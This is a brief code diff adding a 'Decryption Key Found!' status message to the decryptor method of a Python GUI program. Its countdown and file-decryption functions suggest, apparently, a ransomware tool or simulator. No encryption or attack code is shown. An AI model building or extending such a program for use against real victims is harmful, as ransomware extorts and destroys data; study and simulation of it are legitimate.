@@ -108,6 +108,10 @@ def run_countdown(reference_number):
 
         def run_decryptor(self):
             """Run the decryption function."""
+            
+            self.show_message("Decryption Key Found!\nDecryption in Progress...", "yellow")
+            self.root.update_idletasks()  # Force an update of the GUI
+            
             decryption_success = decrypt_files()  # Call the function directly and store the return value
 
             if decryption_success:
